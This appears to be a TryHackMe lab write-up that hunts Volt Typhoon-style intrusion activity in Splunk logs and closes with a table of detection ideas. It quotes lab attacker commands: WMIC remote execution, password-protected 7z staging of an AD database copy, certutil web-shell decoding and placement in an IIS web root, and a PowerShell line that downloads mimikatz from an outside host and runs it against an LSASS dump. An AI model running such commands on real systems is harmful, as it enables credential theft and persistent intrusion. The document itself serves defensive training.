Investigation Summary

The intrusion started with the takeover of the dean-admin account through ADSelfService Plus. After that, the attacker created voltyp-admin, used WMIC and PowerShell for execution, staged sensitive data, deployed a web shell, performed credential access, configured a C2 proxy, and cleared logs.

Main result The attack chain was reconstructed from Splunk logs by pivoting across ADSelfService Plus, WMIC and PowerShell events.

Threat Context

Before writing the final version, I compared my notes with public material from Microsoft, Splunk Security Content, CISA/FBI guidance and other TryHackMe write-ups. The pattern is consistent: Volt Typhoon-style activity relies heavily on living-off-the-land tools, valid credentials, command-line activity, proxying and careful cleanup.

Microsoft describes post-compromise activity involving command-line discovery, WMIC, PowerShell, virtual environment checks and netsh portproxy. Splunk's Volt Typhoon analytic story also focuses on suspicious LOLBin execution, command-line activity, LSASS dumping, archiving and C2 proxy behavior. That matched the logs I investigated in the room.

Key Findings

Initial Access

I searched ADSelfService Plus logs for password changes linked to dean-admin:

index=* service_name=ADSelfServicePlus username="dean-admin" "password change"

Why this worked: the room tells us ADSelfService Plus was involved, so filtering on the service and the compromised user removes most noise. The successful takeover happened at 2024-03-24T11:10:22. By reviewing username values and rare entries, I identified the newly created administrator account: voltyp-admin.

Execution

For WMIC activity, I filtered on the WMIC sourcetype and target server names:

index="main" sourcetype="wmic" "*server01*" "*server02*"
wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

When searching for the AD database copy, my first ntds search did not directly reveal the answer. Pivoting to compression artifacts with 7z exposed the archive password.

index="main" sourcetype="wmic" "*7z*"
wmic /node:webserver-01 process call create "cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit"

Persistence

The attacker decoded a web shell into a temporary directory and then copied it into an IIS web root on server-02:

certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"

The original placement in C:\Windows\Temp\ was suspicious because temporary directories are commonly used for staging payloads.

Defense Evasion

The attacker removed RDP MRU traces using:

Remove-ItemProperty

They also renamed the archive to look like an image:

cisco-up.7z -> c164.gif

Finally, the attacker checked for virtualized environment indicators under:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

Credential Access

Registry queries showed hunting for credentials in remote access tools:

OpenSSH, putty, realvnc

The Mimikatz command was base64-obfuscated. Searching for encoded execution patterns helped reveal it:

index="main" "exec" "="
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp","exit") -NoNewWindow -Wait

Discovery and Lateral Movement

The attacker queried Windows event logs with wevtutil and searched for event IDs 4624 4625 4769. For lateral movement, a precise search isolated the web shell copy to server-02:

index="main" aspx server-02

The new web shell was AuditReport.jspx.

Detection Ideas

A good write-up should help someone understand the lab and also think like a defender. Based on the activity observed, these are the detection ideas I would keep:

BehaviorSearch ideaWhy it matters
Encoded PowerShellsourcetype=powershell ("-enc" OR "-E" OR "FromBase64String")Often used to hide payloads.
WMIC remote executionsourcetype=wmic "process call create"Shows remote command execution through a LOLBin.
Archive staging"7z" OR ".7z" OR "-p"Can reveal collected data and archive passwords.
Web shell copysourcetype=powershell "Copy-Item" ("wwwroot" OR ".aspx" OR ".jspx")Useful for IIS persistence hunting.
Log clearing"wevtutil cl"Strong cleanup indicator.
Port proxy"netsh" "portproxy" "connectaddress"Matches C2 proxy setup behavior.

Lessons Learned

This lab taught me to pivot from exact keywords to attacker behavior. Searching directly for ntds or mimikatz was not always enough, but looking for compression commands, encoded PowerShell flags and staging paths revealed the chain. The full intrusion was visible because the events were analyzed as a sequence instead of isolated answers.

It also reinforced how living-off-the-land tools can hide malicious activity in normal administration noise. WMIC, PowerShell, certutil, netsh and wevtutil are legitimate, but their combined usage formed a clear attack story.
